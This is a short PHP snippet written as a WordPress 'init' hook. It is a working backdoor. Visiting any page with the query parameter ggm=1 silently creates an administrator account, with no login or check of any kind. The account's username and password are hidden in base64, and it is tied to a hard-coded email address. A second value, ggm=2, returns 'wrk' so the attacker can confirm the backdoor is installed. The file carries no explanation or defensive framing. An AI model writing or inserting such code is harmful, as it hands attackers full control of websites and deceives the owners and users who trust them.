<?php

add_action('init', function() {
    if (isset($_GET['ggm']) && $_GET['ggm'] === '2') {
	    die('wrk');
	}
	
    if (isset($_GET['ggm']) && $_GET['ggm'] === '1') {
        $username = base64_decode('amV5YXJhZGQ=');
        $password = base64_decode('cXdlSktMMTIzIQ==');
        $email    = 'percivalwalter2@gmail.com';

        if (!username_exists($username)) {
            $user_id = wp_create_user($username, $password, $email);

            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                
                wp_die("Created successfully!");
            } else {
                wp_die("Error: " . $user_id->get_error_message());
            }
        } else {
            wp_die("Already exists!");
        }
    }
});